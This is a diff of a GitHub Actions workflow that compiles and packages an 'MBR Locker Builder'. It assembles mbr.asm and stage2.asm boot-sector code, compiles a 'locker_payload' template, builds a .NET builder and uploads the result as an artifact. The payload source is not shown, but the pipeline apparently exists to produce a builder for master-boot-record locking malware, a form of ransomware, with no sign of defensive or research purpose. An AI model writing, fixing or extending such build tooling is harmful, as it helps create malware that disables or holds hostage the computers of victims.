@@ -1,4 +1,4 @@
-name: Build Autonomous MBR Locker Builder
+name: Build MBR Locker Builder
 
 on:
   push:
@@ -13,87 +13,53 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v4
 
-    - name: Install MinGW (GCC for Windows)
+    - name: Install NASM
+      run: choco install nasm -y
+
+    - name: Install MinGW
       run: |
         choco install mingw -y
         echo "C:\tools\mingw64\bin" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
 
-    - name: Download and Extract NASM
-      shell: cmd
-      run: |
-        curl -L -o nasm.zip https://www.nasm.us/pub/nasm/releasebuilds/2.16.03/win64/nasm-2.16.03-win64.zip
-        7z x nasm.zip -y
-        mkdir builder\Resources 2>nul
-        for /d %%i in (nasm-*) do copy "%%i\nasm.exe" builder\Resources\nasm.exe
-        if exist builder\Resources\nasm.exe (
-          echo [SUCCESS] NASM extracted
-        ) else (
-          echo [ERROR] NASM not found!
-          dir nasm-*
-          exit /b 1
-        )
-
-    - name: Copy locker.asm to Resources
+    - name: Copy locker.asm files
       shell: cmd
       run: |
         mkdir builder\Resources 2>nul
-        if exist locker\locker.asm (
-          copy locker\locker.asm builder\Resources\locker.asm
-          echo [SUCCESS] locker.asm copied
-        ) else (
-          echo [ERROR] locker.asm not found!
-          dir locker
-          exit /b 1
-        )
-
-    - name: Compile Template (locker_payload.exe)
-      shell: cmd
-      run: |
-        set PATH=C:\tools\mingw64\bin;%PATH%
-        cd template
-        g++ -static -O2 -mwindows locker_payload.cpp -o locker_payload.exe -luser32 -lkernel32 -ladvapi32
-        if exist locker_payload.exe (
-          copy locker_payload.exe ..\builder\Resources\template.exe
-          echo [SUCCESS] Template compiled
-        ) else (
-          echo [ERROR] Template compilation failed!
-          exit /b 1
-        )
+        copy locker\mbr.asm builder\Resources\mbr.asm
+        copy locker\stage2.asm builder\Resources\stage2.asm
+        echo [SUCCESS] ASM files copied
 
     - name: Setup .NET
       uses: actions/setup-dotnet@v4
       with:
         dotnet-version: 6.0.x
 
-    - name: Build Autonomous Builder (Self-Contained)
+    - name: Compile Template
+      shell: cmd
+      run: |
+        set PATH=C:\tools\mingw64\bin;%PATH%
+        cd template
+        g++ -static -O2 -mwindows locker_payload.cpp -o locker_payload.exe -luser32 -lkernel32 -ladvapi32 -lntdll
+        if exist locker_payload.exe (
+          copy locker_payload.exe ..\builder\Resources\template.exe
+          echo [SUCCESS] Template compiled
+        ) else (
+          echo [ERROR] Compilation failed!
+          exit /b 1
+        )
+
+    - name: Build Builder
       shell: cmd
       run: |
         cd builder
         dotnet restore
-        dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true -o ../output
-        if exist ..\output\Builder.exe (
-          echo [SUCCESS] Builder built
-        ) else (
-          echo [ERROR] Builder build failed!
-          exit /b 1
-        )
+        dotnet build -c Release -o ../output
 
-    - name: Upload Autonomous Builder
+    - name: Upload Builder
       uses: actions/upload-artifact@v4
       with:
-        name: AutonomousMbrLockerBuilder
+        name: MbrLockerBuilder
         path: |
           output/
           !output/*.pdb
         if-no-files-found: error
-
-    - name: Upload Source Code
-      uses: actions/upload-artifact@v4
-      with:
-        name: SourceCode
-        path: |
-          builder/
-          locker/
-          template/
-          README.md
-        if-no-files-found: warn
